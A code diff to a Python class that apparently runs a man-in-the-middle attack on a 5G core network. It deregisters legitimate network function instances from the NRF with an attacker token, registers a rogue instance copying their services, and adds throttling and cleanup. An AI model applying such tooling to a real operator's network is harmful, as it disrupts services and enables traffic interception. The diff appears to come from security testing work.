@@ -4,6 +4,7 @@ from src.utils.protocols.api_cn.instance import NFInstance
 
 import random
 import os 
+import time
 
 class CNMitm:
     
@@ -32,9 +33,9 @@ class CNMitm:
         removed_instances: list[NFInstance] = []
         for legitimate_instance in infos["nfInstances"]:
             
-            
             legitimate_id = legitimate_instance["nfInstanceId"]
             
+            # NF created by the attacker dont have valid ip address
             if "ipv4Addresses" in legitimate_instance:
                 legitimate_address = legitimate_instance["ipv4Addresses"][0]
             else : 
@@ -52,6 +53,8 @@ class CNMitm:
             removed = legitimate_instance.remove_nf(CNMitm.attacker_token, display=display)
             removed_instances.append(legitimate_instance)
             
+            time.sleep(1) # avoid overloading the CN
+            
             if not removed :
                 return False
 
@@ -63,7 +66,7 @@ class CNMitm:
         # Its just to make the mitm instance more realistic
         random_instance: NFInstance = random.choice(removed_instances)
         if len(random_instance.services) > 0 : 
-            nb_of_service = random.randint(0, len(random_instance.services))  
+            nb_of_service = random.randint(1, len(random_instance.services))  
             mitm_services = random.sample(random_instance.services, nb_of_service) # get N services from a random instance
         else:
             mitm_services = []
@@ -80,6 +83,8 @@ class CNMitm:
             
             if not added :
                 return False
+            
+            time.sleep(1) # avoid overloading the CN
                         
         return True
                       
@@ -121,4 +126,10 @@ class CNMitm:
         """
         os.popen("pkill -f socat")
         print(f"Removing the mitm instance {CNMitm.mitm_instance.nf_instance_id}")
-        return CNMitm.mitm_instance.remove_nf(CNMitm.attacker_token,display=display)
+        success = CNMitm.mitm_instance.remove_nf(CNMitm.attacker_token,display=display)
+        
+        # refresh the token and remove the nf_instance to avoid polluting the NRF
+        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF", display=display)
+        success = success and CNMitm.attacker_instance.remove_nf(CNMitm.attacker_token, display=False)
+        
+        return success
